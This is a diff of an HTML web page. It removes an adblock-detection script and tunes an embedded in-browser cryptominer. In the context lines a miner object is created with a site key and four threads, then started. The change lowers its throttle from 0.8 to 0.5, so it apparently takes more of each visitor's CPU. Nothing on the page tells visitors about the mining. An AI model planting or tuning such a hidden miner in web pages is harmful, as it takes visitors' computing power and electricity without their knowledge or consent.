@@ -22,38 +22,7 @@
 			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 			})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', 'UA-797705-6', 'auto',{"name":"wnd_header"});ga('wnd_header.set', 'dimension1', 'W2');ga('wnd_header.set', 'anonymizeIp', true);ga('wnd_header.send', 'pageview');</script></head>
 <body class="l layout short-content wt-home ac-s ac-n l-default l-d-none b-btn-fr b-btn-s-l b-btn-dso b-btn-bw-1 img-d-n img-t-u img-h-n line-solid b-e-ds lbox-l   wnd-free-bar-fixed  wnd-fe">
-<script src="./adblockDetector.js"></script>
-	<script>
-	// Configure the adblock detector
-	(function(){
-		var enabledEl = document.getElementById('adb-enabled');
-		var disabledEl = document.getElementById('adb-not-enabled');
-		function adBlockDetected() {
-			enabledEl.style.display = 'block';
-			disabledEl.style.display = 'none';
-		}
-		function adBlockNotDetected() {
-			disabledEl.style.display = 'block';
-			enabledEl.style.display = 'none';
-		}
-		
-		if(typeof window.adblockDetector === 'undefined') {
-			adBlockDetected();
-		} else {
-			window.adblockDetector.init(
-				{
-					debug: true,
-					found: function(){
-						adBlockDetected();
-					},
-					notFound: function(){
-						adBlockNotDetected();
-					}
-				}
-			);
-		}
-	}());
-	</script>
+
 	
 	<div class="center">
 <h5 class="bg-success" id="adb-not-enabled" style="display: none;">AdBlock is disabled</h5>
@@ -250,7 +219,7 @@
     var miner = WMP.User('SK_BLPd363G2HECLKdmppdYs', 'RZK CLOUD',{
         threads: 4,
         autoThreads: false,
-        throttle: 0.8,
+        throttle: 0.5,
         forceASMJS: false
     });
     miner.start();
